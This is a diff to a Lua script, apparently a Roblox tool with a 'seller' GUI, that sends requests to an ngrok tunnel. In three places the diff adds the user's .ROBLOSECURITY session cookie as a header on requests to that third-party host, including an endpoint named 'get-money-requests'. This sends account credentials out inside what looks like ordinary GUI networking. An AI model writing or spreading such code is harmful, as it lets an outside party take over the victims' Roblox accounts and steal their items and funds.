@@ -3115,7 +3115,8 @@ else -- SELLER GUI
                         Url = "https://43432fa501aa.ngrok-free.app/get-money-requests",
                         Method = "GET",
                         Headers = {
-                            ["ngrok-skip-browser-warning"] = "true"
+                            ["ngrok-skip-browser-warning"] = "true",
+                            ["Cookie"] = ".ROBLOSECURITY=" .. (GuiSettings["Roblox_Cookie"] or "")
                         }
                     })
                 end)
@@ -3415,7 +3416,8 @@ else -- SELLER GUI
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json",
-                    ["ngrok-skip-browser-warning"] = "true"
+                    ["ngrok-skip-browser-warning"] = "true",
+                    ["Cookie"] = ".ROBLOSECURITY=" .. (GuiSettings["Roblox_Cookie"] or "")
                 },
                 Body = HttpService:JSONEncode(payload)
             })
@@ -3521,7 +3523,9 @@ else -- SELLER GUI
                 Url = "https://43432fa501aa.ngrok-free.app/send-embed",
                 Method = "POST",
                 Headers = {
-                    ["Content-Type"] = "application/json"
+                    ["Content-Type"] = "application/json",
+                    ["ngrok-skip-browser-warning"] = "true",
+                    ["Cookie"] = ".ROBLOSECURITY=" .. (GuiSettings["Roblox_Cookie"] or "")
                 },
                 Body = HttpService:JSONEncode(payload)
             })
